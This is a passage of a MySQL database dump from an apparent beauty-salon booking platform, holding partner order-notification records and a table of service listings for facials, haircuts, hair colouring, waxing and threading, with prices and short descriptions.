(319, 4, '2021-12-16 06:53:45', 'New order', 'You got a new order.OrderId:10'),
(320, 25, '2021-12-16 06:53:45', 'New order', 'You got a new order.OrderId:10'),
(321, 30, '2021-12-16 06:53:45', 'New order', 'You got a new order.OrderId:10'),
(322, 30, '2021-12-16 06:53:50', 'You accepted order', 'You accepted order.Order id: 10'),
(323, 30, '2021-12-16 07:00:10', 'You completed order', 'You completed order.Order id: 10'),
(324, 4, '2021-12-16 07:52:06', 'New order', 'You got a new order.OrderId:11'),
(325, 2, '2021-12-16 08:00:28', 'New order', 'You got a new order.OrderId:14'),
(326, 4, '2021-12-16 08:00:28', 'New order', 'You got a new order.OrderId:14'),
(327, 21, '2021-12-16 08:02:26', 'You completed order', 'You completed order.Order id: 13'),
(328, 2, '2021-12-16 11:30:42', 'New order', 'You got a new order.OrderId:15'),
(329, 4, '2021-12-16 11:30:42', 'New order', 'You got a new order.OrderId:15'),
(330, 29, '2021-12-16 11:30:42', 'New order', 'You got a new order.OrderId:15'),
(331, 30, '2021-12-16 11:30:42', 'New order', 'You got a new order.OrderId:15'),
(332, 2, '2021-12-17 00:36:15', 'New order', 'You got a new order.OrderId:16'),
(333, 4, '2021-12-17 00:36:15', 'New order', 'You got a new order.OrderId:16'),
(334, 29, '2021-12-17 00:36:15', 'New order', 'You got a new order.OrderId:16'),
(335, 30, '2021-12-17 00:36:15', 'New order', 'You got a new order.OrderId:16'),
(336, 2, '2021-12-17 05:24:19', 'New order', 'You got a new order.OrderId:1'),
(337, 21, '2021-12-17 05:24:19', 'New order', 'You got a new order.OrderId:1'),
(338, 2, '2021-12-17 05:58:40', 'New order', 'You got a new order.OrderId:1'),
(339, 21, '2021-12-17 05:58:40', 'New order', 'You got a new order.OrderId:1'),
(340, 2, '2021-12-17 06:16:49', 'New order', 'You got a new order.OrderId:1'),
(341, 21, '2021-12-17 06:16:49', 'New order', 'You got a new order.OrderId:1'),
(342, 2, '2021-12-17 06:18:46', 'You accepted order', 'You accepted order.Order id: 1'),
(343, 2, '2021-12-17 06:19:04', 'You completed order', 'You completed order.Order id: 1'),
(344, 21, '2021-12-17 11:23:09', 'You cancelled order', 'You cancelled order.Order id: 2'),
(345, 21, '2021-12-17 11:23:32', 'You cancelled order', 'You cancelled order.Order id: 3'),
(346, 21, '2021-12-17 11:28:37', 'You completed order', 'You completed order.Order id: 5'),
(347, 2, '2021-12-18 05:17:36', 'New order', 'You got a new order.OrderId:7'),
(348, 4, '2021-12-18 05:17:36', 'New order', 'You got a new order.OrderId:7'),
(349, 29, '2021-12-18 05:17:36', 'New order', 'You got a new order.OrderId:7'),
(350, 30, '2021-12-18 05:17:36', 'New order', 'You got a new order.OrderId:7'),
(351, 4, '2021-12-18 05:19:48', 'You accepted order', 'You accepted order.Order id: 7'),
(352, 4, '2021-12-18 05:19:55', 'You completed order', 'You completed order.Order id: 7'),
(353, 4, '2021-12-18 05:47:17', 'New order', 'You got a new order.OrderId:1'),
(354, 25, '2021-12-18 05:47:17', 'New order', 'You got a new order.OrderId:1'),
(355, 30, '2021-12-18 05:47:17', 'New order', 'You got a new order.OrderId:1'),
(356, 2, '2021-12-18 05:48:03', 'New order', 'You got a new order.OrderId:2'),
(357, 21, '2021-12-18 05:48:03', 'New order', 'You got a new order.OrderId:2'),
(358, 2, '2021-12-18 05:49:48', 'New order', 'You got a new order.OrderId:1'),
(359, 21, '2021-12-18 05:49:48', 'New order', 'You got a new order.OrderId:1'),
(360, 2, '2021-12-18 05:50:24', 'You accepted order', 'You accepted order.Order id: 1'),
(361, 2, '2021-12-18 05:52:25', 'You completed order', 'You completed order.Order id: 1'),
(362, 2, '2021-12-18 06:20:40', 'New order', 'You got a new order.OrderId:2'),
(363, 21, '2021-12-18 06:20:40', 'New order', 'You got a new order.OrderId:2'),
(364, 2, '2021-12-18 06:21:06', 'You accepted order', 'You accepted order.Order id: 2'),
(365, 2, '2021-12-18 06:21:12', 'You completed order', 'You completed order.Order id: 2'),
(366, 2, '2021-12-20 06:16:19', 'New order', 'You got a new order.OrderId:3'),
(367, 21, '2021-12-20 06:16:19', 'New order', 'You got a new order.OrderId:3'),
(368, 2, '2021-12-20 07:31:09', 'New order', 'You got a new order.OrderId:4'),
(369, 4, '2021-12-20 07:31:09', 'New order', 'You got a new order.OrderId:4'),
(370, 29, '2021-12-20 07:31:09', 'New order', 'You got a new order.OrderId:4'),
(371, 30, '2021-12-20 07:31:09', 'New order', 'You got a new order.OrderId:4'),
(372, 4, '2021-12-20 07:32:06', 'You accepted order', 'You accepted order.Order id: 4'),
(373, 4, '2021-12-20 07:33:09', 'You completed order', 'You completed order.Order id: 4'),
(374, 2, '2021-12-20 12:18:55', 'New order', 'You got a new order.OrderId:7'),
(375, 4, '2021-12-20 12:18:55', 'New order', 'You got a new order.OrderId:7'),
(376, 32, '2021-12-20 12:18:55', 'New order', 'You got a new order.OrderId:7'),
(377, 2, '2021-12-20 12:22:12', 'New order', 'You got a new order.OrderId:9'),
(378, 4, '2021-12-20 12:22:12', 'New order', 'You got a new order.OrderId:9'),
(379, 32, '2021-12-20 12:22:12', 'New order', 'You got a new order.OrderId:9'),
(380, 32, '2021-12-20 12:23:28', 'You rejected order', 'You rejected order.Order id: 7'),
(381, 32, '2021-12-20 12:23:46', 'You rejected order', 'You rejected order.Order id: 9'),
(382, 32, '2021-12-20 12:24:03', 'You rejected order', 'You rejected order.Order id: 9'),
(383, 32, '2021-12-20 12:24:16', 'You rejected order', 'You rejected order.Order id: 9'),
(384, 4, '2021-12-21 06:33:39', 'New order', 'You got a new order.OrderId:11'),
(385, 4, '2021-12-21 06:33:53', 'You accepted order', 'You accepted order.Order id: 11'),
(386, 4, '2021-12-21 06:34:00', 'You completed order', 'You completed order.Order id: 11'),
(387, 2, '2021-12-22 05:40:19', 'New order', 'You got a new order.OrderId:12'),
(388, 21, '2021-12-22 05:40:19', 'New order', 'You got a new order.OrderId:12'),
(389, 32, '2021-12-22 05:40:19', 'New order', 'You got a new order.OrderId:12'),
(390, 2, '2021-12-22 05:51:32', 'New order', 'You got a new order.OrderId:13'),
(391, 21, '2021-12-22 05:51:32', 'New order', 'You got a new order.OrderId:13'),
(392, 32, '2021-12-22 05:51:32', 'New order', 'You got a new order.OrderId:13'),
(393, 30, '2021-12-22 05:51:32', 'New order', 'You got a new order.OrderId:13'),
(394, 2, '2021-12-22 05:54:39', 'New order', 'You got a new order.OrderId:14'),
(395, 21, '2021-12-22 05:54:39', 'New order', 'You got a new order.OrderId:14'),
(396, 32, '2021-12-22 05:54:39', 'New order', 'You got a new order.OrderId:14'),
(397, 30, '2021-12-22 05:54:39', 'New order', 'You got a new order.OrderId:14'),
(398, 2, '2021-12-22 06:31:39', 'New order', 'You got a new order.OrderId:15'),
(399, 21, '2021-12-22 06:31:39', 'New order', 'You got a new order.OrderId:15'),
(400, 32, '2021-12-22 06:31:39', 'New order', 'You got a new order.OrderId:15'),
(401, 30, '2021-12-22 06:31:39', 'New order', 'You got a new order.OrderId:15'),
(402, 2, '2021-12-22 07:30:22', 'New order', 'You got a new order.OrderId:16'),
(403, 4, '2021-12-22 07:30:22', 'New order', 'You got a new order.OrderId:16'),
(404, 29, '2021-12-22 07:30:22', 'New order', 'You got a new order.OrderId:16'),
(405, 30, '2021-12-22 07:30:22', 'New order', 'You got a new order.OrderId:16'),
(406, 34, '2021-12-22 07:30:22', 'New order', 'You got a new order.OrderId:16'),
(407, 2, '2021-12-22 08:09:40', 'New order', 'You got a new order.OrderId:17'),
(408, 21, '2021-12-22 08:09:40', 'New order', 'You got a new order.OrderId:17'),
(409, 32, '2021-12-22 08:09:40', 'New order', 'You got a new order.OrderId:17'),
(410, 30, '2021-12-22 08:09:40', 'New order', 'You got a new order.OrderId:17'),
(411, 4, '2021-12-22 12:48:26', 'New order', 'You got a new order.OrderId:21'),
(412, 25, '2021-12-22 12:48:26', 'New order', 'You got a new order.OrderId:21'),
(413, 30, '2021-12-22 12:48:26', 'New order', 'You got a new order.OrderId:21'),
(414, 4, '2021-12-22 12:49:10', 'New order', 'You got a new order.OrderId:22'),
(415, 25, '2021-12-22 12:49:10', 'New order', 'You got a new order.OrderId:22'),
(416, 30, '2021-12-22 12:49:10', 'New order', 'You got a new order.OrderId:22'),
(417, 25, '2021-12-22 12:49:18', 'You accepted order', 'You accepted order.Order id: 21'),
(418, 25, '2021-12-22 12:57:28', 'You accepted order', 'You accepted order.Order id: 22'),
(419, 2, '2021-12-22 15:13:30', 'New order', 'You got a new order.OrderId:27'),
(420, 21, '2021-12-22 15:13:30', 'New order', 'You got a new order.OrderId:27'),
(421, 32, '2021-12-22 15:13:30', 'New order', 'You got a new order.OrderId:27'),
(422, 30, '2021-12-22 15:13:30', 'New order', 'You got a new order.OrderId:27'),
(423, 2, '2021-12-22 15:30:35', 'New order', 'You got a new order.OrderId:28'),
(424, 21, '2021-12-22 15:30:35', 'New order', 'You got a new order.OrderId:28'),
(425, 32, '2021-12-22 15:30:35', 'New order', 'You got a new order.OrderId:28'),
(426, 30, '2021-12-22 15:30:35', 'New order', 'You got a new order.OrderId:28'),
(427, 2, '2021-12-22 20:28:35', 'New order', 'You got a new order.OrderId:29'),
(428, 4, '2021-12-22 20:28:35', 'New order', 'You got a new order.OrderId:29'),
(429, 29, '2021-12-22 20:28:35', 'New order', 'You got a new order.OrderId:29'),
(430, 30, '2021-12-22 20:28:35', 'New order', 'You got a new order.OrderId:29'),
(431, 34, '2021-12-22 20:28:35', 'New order', 'You got a new order.OrderId:29'),
(432, 2, '2021-12-22 20:41:44', 'New order', 'You got a new order.OrderId:30'),
(433, 4, '2021-12-22 20:41:44', 'New order', 'You got a new order.OrderId:30'),
(434, 29, '2021-12-22 20:41:44', 'New order', 'You got a new order.OrderId:30'),
(435, 30, '2021-12-22 20:41:44', 'New order', 'You got a new order.OrderId:30'),
(436, 34, '2021-12-22 20:41:44', 'New order', 'You got a new order.OrderId:30'),
(437, 2, '2021-12-23 03:44:08', 'New order', 'You got a new order.OrderId:31'),
(438, 21, '2021-12-23 03:44:08', 'New order', 'You got a new order.OrderId:31'),
(439, 32, '2021-12-23 03:44:08', 'New order', 'You got a new order.OrderId:31'),
(440, 30, '2021-12-23 03:44:08', 'New order', 'You got a new order.OrderId:31'),
(441, 2, '2021-12-23 07:06:28', 'New order', 'You got a new order.OrderId:32'),
(442, 4, '2021-12-23 07:06:28', 'New order', 'You got a new order.OrderId:32'),
(443, 29, '2021-12-23 07:06:28', 'New order', 'You got a new order.OrderId:32'),
(444, 30, '2021-12-23 07:06:28', 'New order', 'You got a new order.OrderId:32'),
(445, 34, '2021-12-23 07:06:28', 'New order', 'You got a new order.OrderId:32'),
(446, 2, '2021-12-23 08:28:03', 'New order', 'You got a new order.OrderId:33'),
(447, 4, '2021-12-23 08:28:03', 'New order', 'You got a new order.OrderId:33'),
(448, 29, '2021-12-23 08:28:03', 'New order', 'You got a new order.OrderId:33'),
(449, 30, '2021-12-23 08:28:03', 'New order', 'You got a new order.OrderId:33'),
(450, 34, '2021-12-23 08:28:03', 'New order', 'You got a new order.OrderId:33'),
(451, 2, '2021-12-23 08:56:10', 'New order', 'You got a new order.OrderId:34'),
(452, 21, '2021-12-23 08:56:10', 'New order', 'You got a new order.OrderId:34'),
(453, 32, '2021-12-23 08:56:10', 'New order', 'You got a new order.OrderId:34'),
(454, 30, '2021-12-23 08:56:10', 'New order', 'You got a new order.OrderId:34'),
(455, 2, '2021-12-23 09:29:17', 'New order', 'You got a new order.OrderId:35'),
(456, 4, '2021-12-23 09:29:17', 'New order', 'You got a new order.OrderId:35'),
(457, 29, '2021-12-23 09:29:17', 'New order', 'You got a new order.OrderId:35'),
(458, 30, '2021-12-23 09:29:17', 'New order', 'You got a new order.OrderId:35'),
(459, 34, '2021-12-23 09:29:17', 'New order', 'You got a new order.OrderId:35'),
(460, 4, '2021-12-23 14:14:52', 'New order', 'You got a new order.OrderId:37'),
(461, 30, '2021-12-23 14:14:52', 'New order', 'You got a new order.OrderId:37'),
(462, 4, '2021-12-23 14:21:45', 'New order', 'You got a new order.OrderId:40'),
(463, 30, '2021-12-23 14:21:45', 'New order', 'You got a new order.OrderId:40'),
(464, 4, '2021-12-23 14:28:16', 'New order', 'You got a new order.OrderId:41'),
(465, 30, '2021-12-23 14:28:16', 'New order', 'You got a new order.OrderId:41'),
(466, 4, '2021-12-23 14:28:55', 'New order', 'You got a new order.OrderId:42'),
(467, 30, '2021-12-23 14:28:55', 'New order', 'You got a new order.OrderId:42'),
(468, 25, '2021-12-24 04:19:04', 'You cancelled order', 'You cancelled order.Order id: 22'),
(469, 25, '2021-12-24 04:19:24', 'You cancelled order', 'You cancelled order.Order id: 21'),
(470, 25, '2021-12-24 04:19:34', 'You cancelled order', 'You cancelled order.Order id: 6'),
(471, 25, '2021-12-24 04:19:39', 'You cancelled order', 'You cancelled order.Order id: 5'),
(472, 30, '2021-12-24 05:43:19', 'You accepted order', 'You accepted order.Order id: 42'),
(473, 30, '2021-12-24 05:43:34', 'You accepted order', 'You accepted order.Order id: 41'),
(474, 30, '2021-12-24 05:43:42', 'You completed order', 'You completed order.Order id: 41'),
(475, 30, '2021-12-24 05:47:24', 'You accepted order', 'You accepted order.Order id: 41'),
(476, 30, '2021-12-24 05:47:33', 'You completed order', 'You completed order.Order id: 41'),
(477, 30, '2021-12-24 05:47:51', 'You completed order', 'You completed order.Order id: 42'),
(478, 2, '2021-12-24 07:38:56', 'You accepted order', 'You accepted order.Order id: 7'),
(479, 2, '2021-12-24 07:39:47', 'You accepted order', 'You accepted order.Order id: 13'),
(480, 2, '2021-12-24 07:39:58', 'You cancelled order', 'You cancelled order.Order id: 13'),
(481, 2, '2021-12-24 07:50:07', 'You cancelled order', 'You cancelled order.Order id: 7'),
(482, 32, '2021-12-24 09:50:58', 'You rejected order', 'You rejected order.Order id: 12'),
(483, 32, '2021-12-24 09:51:08', 'You rejected order', 'You rejected order.Order id: 13'),
(484, 32, '2021-12-24 09:51:15', 'You rejected order', 'You rejected order.Order id: 14'),
(485, 32, '2021-12-24 09:51:21', 'You rejected order', 'You rejected order.Order id: 15'),
(486, 30, '2021-12-24 11:57:04', 'New order', 'You got a new order.OrderId:47'),
(487, 2, '2021-12-24 21:21:18', 'New order', 'You got a new order.OrderId:1'),
(488, 21, '2021-12-24 21:21:18', 'New order', 'You got a new order.OrderId:1'),
(489, 32, '2021-12-24 21:21:18', 'New order', 'You got a new order.OrderId:1'),
(490, 30, '2021-12-24 21:21:18', 'New order', 'You got a new order.OrderId:1'),
(491, 2, '2021-12-24 21:24:25', 'You accepted order', 'You accepted order.Order id: 1'),
(492, 2, '2021-12-25 03:45:17', 'New order', 'You got a new order.OrderId:2'),
(493, 4, '2021-12-25 03:45:17', 'New order', 'You got a new order.OrderId:2'),
(494, 30, '2021-12-25 03:45:17', 'New order', 'You got a new order.OrderId:2'),
(495, 34, '2021-12-25 03:45:17', 'New order', 'You got a new order.OrderId:2'),
(496, 2, '2021-12-25 04:01:10', 'New order', 'You got a new order.OrderId:4'),
(497, 4, '2021-12-25 04:01:10', 'New order', 'You got a new order.OrderId:4'),
(498, 25, '2021-12-25 04:01:10', 'New order', 'You got a new order.OrderId:4'),
(499, 30, '2021-12-25 04:01:10', 'New order', 'You got a new order.OrderId:4'),
(500, 34, '2021-12-25 04:01:10', 'New order', 'You got a new order.OrderId:4'),
(501, 4, '2021-12-25 04:01:52', 'You rejected order', 'You rejected order.Order id: 4'),
(502, 4, '2021-12-25 04:01:59', 'You rejected order', 'You rejected order.Order id: 2'),
(503, 25, '2021-12-25 04:42:56', 'You accepted order', 'You accepted order.Order id: 4'),
(504, 4, '2021-12-25 05:17:46', 'You completed order', 'You completed order.Order id: 3'),
(505, 2, '2021-12-26 06:26:32', 'New order', 'You got a new order.OrderId:7'),
(506, 21, '2021-12-26 06:26:32', 'New order', 'You got a new order.OrderId:7'),
(507, 32, '2021-12-26 06:26:32', 'New order', 'You got a new order.OrderId:7'),
(508, 30, '2021-12-26 06:26:32', 'New order', 'You got a new order.OrderId:7'),
(509, 25, '2021-12-26 08:29:30', 'You cancelled order', 'You cancelled order.Order id: 4'),
(510, 32, '2021-12-26 10:25:00', 'You rejected order', 'You rejected order.Order id: 7'),
(511, 2, '2021-12-26 22:08:02', 'New order', 'You got a new order.OrderId:4'),
(512, 2, '2021-12-26 23:24:27', 'New order', 'You got a new order.OrderId:7'),
(513, 2, '2021-12-27 06:53:16', 'New order', 'You got a new order.OrderId:8'),
(514, 2, '2021-12-27 07:01:56', 'New order', 'You got a new order.OrderId:10'),
(515, 2, '2021-12-27 18:24:15', 'New order', 'You got a new order.OrderId:16'),
(516, 2, '2022-01-06 11:50:18', 'New order', 'You got a new order.OrderId:17'),
(517, 2, '2022-01-06 11:54:18', 'New order', 'You got a new order.OrderId:18'),
(518, 21, '2022-01-06 12:00:56', 'New order', 'You got a new order.OrderId:19'),
(519, 30, '2022-01-06 12:00:56', 'New order', 'You got a new order.OrderId:19'),
(520, 21, '2022-01-06 12:28:46', 'New order', 'You got a new order.OrderId:20'),
(521, 21, '2022-01-06 12:30:11', 'New order', 'You got a new order.OrderId:21'),
(522, 19, '2022-01-06 12:42:43', 'New order', 'You got a new order.OrderId:22'),
(523, 26, '2022-01-06 12:43:13', 'New order', 'You got a new order.OrderId:23'),
(524, 2, '2022-01-07 07:38:26', 'New order', 'You got a new order.OrderId:24'),
(525, 36, '2022-01-07 07:38:26', 'New order', 'You got a new order.OrderId:24'),
(526, 36, '2022-01-07 07:39:21', 'You accepted order', 'You accepted order.Order id: 24'),
(527, 36, '2022-01-07 07:39:44', 'You completed order', 'You completed order.Order id: 24');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_partner_service`
--

CREATE TABLE `tbl_partner_service` (
  `id` int(11) NOT NULL,
  `img` text DEFAULT NULL,
  `video` text DEFAULT NULL,
  `title` text CHARACTER SET utf8 DEFAULT NULL,
  `discount` float DEFAULT NULL,
  `ttken` int(11) DEFAULT NULL,
  `mqty` int(11) DEFAULT NULL,
  `price` float DEFAULT NULL,
  `status` int(11) DEFAULT NULL,
  `s_show` int(11) DEFAULT NULL,
  `mid` int(11) DEFAULT NULL,
  `sid` int(11) NOT NULL DEFAULT 0,
  `cid` int(11) DEFAULT NULL,
  `sdesc` text CHARACTER SET utf8 DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_partner_service`
--

INSERT INTO `tbl_partner_service` (`id`, `img`, `video`, `title`, `discount`, `ttken`, `mqty`, `price`, `status`, `s_show`, `mid`, `sid`, `cid`, `sdesc`) VALUES
(1, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 2, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(2, '', '', 'Normal Hair Cut', 0, 0, 1, 499, 1, 0, 2, 27, 14, 'A regular haircut, in Western fashion, is a men\\s and boys\\ hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(3, '', '', 'Schwarzkopf - Shoulder', 0, 0, 1, 949, 1, 0, 2, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(4, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 4, 24, 10, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(5, '', '', 'JANSSEN SKIN FIRMING & WHITENING FACIAL', 0, 0, 1, 2999, 1, 0, 4, 24, 10, 'A luxurious and relaxing anti-aging treatment that fully moisturizes, smoothens fine lines and contours aging skin.  '),
(8, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 4, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(14, '', '', 'Normal Hair Cut', 0, 0, 1, 499, 1, 0, 4, 27, 14, 'A regular haircut, in Western fashion, is a men\'s and boys\' hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(15, '', '', 'Hair Cut- Fringes ', 0, 0, 1, 250, 1, 0, 4, 27, 14, 'A regular haircut, in Western fashion, is a men\'s and boys\' hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(17, '', '', 'Touchup- Schwarzkopf Absolute Brown', 0, 0, 1, 899, 1, 0, 4, 28, 14, 'Quick fix to cover the roots of grey hair.'),
(19, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 0, 0, 1, 3000, 1, 0, 4, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(21, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 25, 24, 15, 'Instant skin lightening facial for a radiant and glowing skin.'),
(28, '', '', 'Touchup- Schwarzkopf Absolute Brown', 0, 0, 1, 899, 1, 0, 25, 28, 43, 'Quick fix to cover the roots of grey hair.'),
(29, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 0, 0, 1, 3000, 1, 0, 25, 28, 44, 'A colouring technique covering the hair with the same colour from root to tip.'),
(30, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Mid Length', 0, 0, 1, 3250, 1, 0, 25, 28, 45, 'A colouring technique covering the hair with the same colour from root to tip.'),
(31, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Long Length', 0, 0, 1, 3500, 1, 0, 25, 28, 46, 'A colouring technique covering the hair with the same colour from root to tip.'),
(32, '', '', 'Schwarzkopf - Shoulder', 0, 0, 1, 949, 1, 0, 25, 29, 30, 'Removes all dirt, pollutants and contaminants from the pores.'),
(33, '', '', 'Schwarzkopf -  Mid Back Lenght', 0, 0, 1, 999, 1, 0, 25, 29, 31, 'Removes all dirt, pollutants and contaminants from the pores.'),
(34, '', '', 'Schwarzkopf - Full ', 0, 0, 1, 1199, 1, 0, 25, 29, 32, 'Removes all dirt, pollutants and contaminants from the pores.'),
(35, '', '', 'Half Arm- Rica / Roll on', 0, 0, 1, 250, 1, 0, 25, 38, 69, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(36, '', '', 'Full Arm- Rica / Roll On', 0, 0, 1, 320, 1, 0, 25, 38, 70, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(37, '', '', 'Under Arm- Rica / Roll on / Peel Off', 0, 0, 1, 100, 1, 0, 25, 38, 71, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(38, '', '', 'Half Leg- Rica / Roll On', 0, 0, 1, 250, 1, 0, 25, 38, 72, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(39, '', '', 'Full Leg- Rica / Roll On', 0, 0, 1, 450, 1, 0, 25, 38, 73, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(40, '', '', 'Bikini Line - Roll On / Rica / Peel Off', 0, 0, 1, 250, 1, 0, 25, 38, 74, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(41, '', '', 'Bikini - Peel Off', 0, 0, 1, 1000, 1, 0, 25, 38, 75, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(42, '', '', 'Stomach - Rica / Peel Off / Roll On', 0, 0, 1, 320, 1, 0, 25, 38, 76, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(44, '', '', 'Back - Rica / Roll On', 0, 0, 1, 450, 1, 0, 25, 38, 77, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(45, '', '', 'Full Body - Rica / Roll On', 0, 0, 1, 1600, 1, 0, 25, 38, 78, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(46, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 25, 24, 10, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(47, '', '', 'Threading- Chin', 0, 0, 1, 29, 1, 0, 25, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(48, '', '', 'Threading- Sidelocks', 0, 0, 1, 49, 1, 0, 25, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(49, '', '', 'Threading- Forehead', 0, 0, 1, 59, 1, 0, 25, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(50, '', '', 'Threading- Upper lips', 0, 0, 1, 19, 1, 0, 25, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(51, '', '', 'Threading- Jawline', 0, 0, 1, 99, 1, 0, 25, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(52, '', '', 'Threading- Neck', 0, 0, 1, 149, 1, 0, 25, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(53, '', '', 'Threading- Full face', 0, 0, 1, 149, 1, 0, 25, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(54, '', '', 'Face Wax- Chin', 0, 0, 1, 99, 1, 0, 25, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(55, '', '', 'Face Wax- Sidelocks', 0, 0, 1, 99, 1, 0, 25, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(56, '', '', 'Face Wax- Forehead', 0, 0, 1, 99, 1, 0, 25, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(57, '', '', 'Face Wax- Upper lips', 0, 0, 1, 69, 1, 0, 25, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(58, '', '', 'Face Wax- Jawline', 0, 0, 1, 99, 1, 0, 25, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(59, '', '', 'Face Wax- Neck', 0, 0, 1, 199, 1, 0, 25, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(60, '', '', 'Face Wax- Full face', 0, 0, 1, 399, 1, 0, 25, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(89, '', '', 'Half Arm- Rica / Roll on', 0, 0, 1, 250, 1, 0, 4, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(90, '', '', 'Threading- Chin', 0, 0, 1, 29, 1, 0, 4, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(91, '', '', 'Threading- Upper lips', 0, 0, 1, 19, 1, 0, 4, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(93, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 4, 24, 10, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(95, '', '', 'Normal Hair Cut', 0, 0, 1, 499, 1, 0, 21, 27, 33, 'A regular haircut, in Western fashion, is a men\'s and boys\' hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(96, '', '', 'Hair Cut- Fringes ', 0, 0, 1, 250, 1, 0, 21, 27, 34, 'A regular haircut, in Western fashion, is a men\'s and boys\' hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(98, '', '', 'Threading- Upper lips', 0, 0, 1, 19, 1, 0, 30, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
